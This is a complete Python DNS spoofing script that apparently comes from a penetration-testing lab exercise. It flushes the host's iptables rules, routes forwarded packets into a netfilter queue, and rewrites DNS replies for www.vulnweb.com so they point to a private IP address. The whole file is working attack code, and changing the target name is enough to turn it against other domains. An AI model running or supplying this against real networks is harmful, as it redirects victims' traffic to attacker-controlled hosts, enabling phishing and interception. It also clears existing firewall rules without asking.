import scapy.all as scapy
import netfilterqueue
import subprocess


subprocess.run("iptables --flush", check=True, shell=True)
subprocess.run("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", check=True, shell=True)
# subprocess.run("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", check=True, shell=True)
# subprocess.run("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", check=True, shell=True)


def process_packet(packet):
        try:
                scapy_packet = scapy.IP(packet.get_payload())
                if scapy_packet.haslayer(scapy.DNSRR):
                        qname = scapy_packet[scapy.DNSQR].qname

                        url = "www.vulnweb.com".encode()
                        print(qname)
                        if url in qname:
                                print("[+] Spoofing target... \n")
                                answer = scapy.DNSRR(rrname=qname, rdata="192.168.170.129")
                                scapy_packet[scapy.DNS].an = answer
                                scapy_packet[scapy.DNS].ancount = 1

                                del scapy_packet[scapy.IP].len
                                del scapy_packet[scapy.IP].chksum
                                del scapy_packet[scapy.UDP].len
                                del scapy_packet[scapy.UDP].chksum

                                packet.set_payload(bytes(scapy_packet))
                
                packet.accept()
        except Exception as e:
                print(f"Error spoofing DNS.. \n{e}")

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
